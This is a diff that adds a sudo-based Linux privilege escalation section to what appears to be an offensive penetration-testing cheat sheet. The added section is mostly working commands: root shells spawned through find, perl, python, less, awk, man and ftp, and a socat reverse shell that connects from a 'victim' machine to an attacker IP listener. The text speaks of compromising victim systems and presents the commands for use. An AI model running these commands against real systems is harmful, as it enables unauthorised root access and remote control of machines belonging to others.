@@ -356,6 +356,107 @@ find / -name netcat*
 find / -name tftp* 
 find / -name ftp 
 
+### Linux Privilege Escalation using Sudo Rights
+NOTE:
+
+(ALL:ALL) can also represent as (ALL)
+If you found (root) in place of (ALL:ALL) then it denotes that user can run the command as root.
+If nothing is mention for user/group then it means sudo defaults to the root user.
+
+# Traditional Method to assign Root Privilege 
+visudo
+usertest ALL=(ALL:ALL) ALL
+or
+usertest ALL=(ALL) ALL
+
+# Spawn Root Access
+Suppose you successfully login into victim’s machine through ssh and want to know sudo rights for the current user then execute below command.
+sudo -l
+In the traditional method, PASSWD option is enabled for user authentication while executing above command and it can be disabled by using NOPASSWD tag. The highlighted text is indicating that current user is authorized to execute all command. Therefore we have obtained root access by executing the command.
+sudo su
+id
+
+# Default Method to assign Root Privilege 
+Default Method to assign Root Privilege to usertest under User Privilege Specification category.
+visudo
+usertest ALL=ALL
+or
+usertest ALL=(root) ALL
+
+# Allow Root Privilege to Binary commands
+Sometimes the user has the authorization to execute any file or command of a particular directory such as /bin/cp, /bin/cat or /usr/bin/ find, this type of permission lead to privilege escalation for root access and it can be implemented with help of following steps.
+usertest ALL=(root) NOPASSWD: /usr/bin/find
+NOTE: Here NOPASSWD tag that means no password will be requested for the user while running sudo -l command.
+ 
+# Spawn Root Access using Find Command
+compromised the Victim’s system and then move for privilege escalation phase and execute below command to view sudo user list.
+sudo -l
+>	User usertest may run the following commands on ubuntu
+>	(root) NOPASSWD: /usr/bin/find
+indicating that the usertest can run any command through find command. Therefore we got root access by executing below commands.
+sudo find /home -exec /bin/bash \;
+id
+>	uid=0(root) gid=0(root) groups=0(root)
+
+# Allow Root Privilege to Binary Programs
+Sometimes admin assigns delicate authorities to a particular user to run binary programs which allow a user to edit any system files such as /etc/passwd and so on. certain binary programs lead to privilege escalation. In the following command we have assign sudo rights to the following program which can be run as root user.
+usertest ALL= (root) NOPASSWD: usr/bin/perl, /usr/bin/python, /usr/bin/less, /usr/bin/awk, /usr/bin/man, /usr/bin/vi
+
+# Spawn shell using Perl one-liner
+At the time of privilege, escalation phase executes below command to view sudo user list.
+sudo -l
+Now you can observe the text is showing that the usertest can run Perl language program or script as root user. (/usr/bin/perl) Therefore we got root access by executing Perl one-liner.
+perl -e 'exec "/bin/bash";'
+
+# Spawn shell using Python one-liner 
+requires that the user can run the python language or script as root user. (/usr/bin/python) this can be determined by running
+sudo -l 
+thus we can aquire root access by executing the python one-liner
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+# Spawn shell using Less Command
+requires that the user can run the less command as root user. (usr/bin/less) this can be determined by running
+sudo -l
+Hence we obtained root access by executing following
+sudo less /etc/hosts
+It will open requested system file for editing, BUT for spawning root shell type !bash as shown below and hit enter.
+!bash
+You will get root access.
+
+# Spawn shell using AWK one-liner 
+requires that the user can run the AWK language program or script as root user. (usr/bin/awk) this can be determined by running
+sudo -l
+Therefore we obtained root access by executing AWK one-liner.
+sudo awk 'BEGIN {system("/bin/bash")}'
+
+# Spawn shell using Man Command (Manual page)
+requires that the user can run the less command as root user. (usr/bin/man) this can be determined by running
+sudo -l
+sudo man man 
+It will be displaying Linux manual pages for editing, BUT for spawning root shell type !bash as presented below and hit enter, you get root access as done above using Less command.
+!bash 
+You will get root access.
+
+# Spawn Shell Using FTP
+get root access through FTP with the help of following commands:
+sudo ftp
+! /bin/bash
+whoami
+or
+! /bin/sh
+id
+whoami
+>	root
+
+# Spawn Shell Using Socat
+get root access through socat with the help of following commands. Execute below command on the attacker’s terminal in order to enable listener for reverse connection.
+socat file:`tty`,raw,echo=0 tcp-listen:1234
+Then run the following command on victim’s machine and you will get root access on your attacker machine.
+socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
+id 
+whoami 
+>	root 
+
 
 Finding exploit code
 http://www.exploit-db.com
